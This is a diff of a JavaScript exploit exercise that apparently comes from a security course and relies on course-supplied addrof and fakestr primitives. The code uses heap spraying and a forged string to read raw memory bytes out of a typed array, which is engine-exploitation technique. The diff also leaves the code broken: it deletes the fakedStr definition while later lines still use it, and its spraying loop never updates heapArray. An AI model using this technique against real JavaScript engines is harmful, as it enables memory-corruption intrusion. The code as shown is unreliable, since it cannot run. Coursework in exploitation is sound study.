@@ -3,29 +3,22 @@
  */
 
 
-let dataPlane = new Uint32Array(1);
-let fakedStr = cs361s.fakestr(cs361s.addrof("\x01\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00") + 16);
-
-// use heap spraying to find the address of a typed array in range of fakedstr length
 let heapArray = new Uint32Array(72);
 while (cs361s.addrof(heapArray) < cs361s.addrof(fakedStr) || cs361s.addrof(heapArray) > cs361s.addrof(fakedStr) - 72 + 16 + 10000000) {
     array = new Uint32Array(72);
 }
-
-print('Here');
-
 let testing = function(){
     print('Test');
     print(cs361s.addrof(fakedStr));
     print(cs361s.addrof(fakedStr) - 56);
     print(cs361s.addrof(fakedStr) - 56 + (2 ** 28));
 };
-
+let offset = cs361s.addrof(heapArray) - (cs361s.addrof(fakedStr) + 16);
 let bytes = new Uint8Array(72);
 //move chars rom fake string to bytes array
 var index = 0;
 while(index < bytes.length){
-    bytes[index] = fakedStr.charCodeAt(cs361s.addrof(heapArray) - cs361s.addrof(fakedStr) + 16 + index);
+    bytes[index] = fakedStr.charCodeAt(offset + index);
     index++;
 }
 
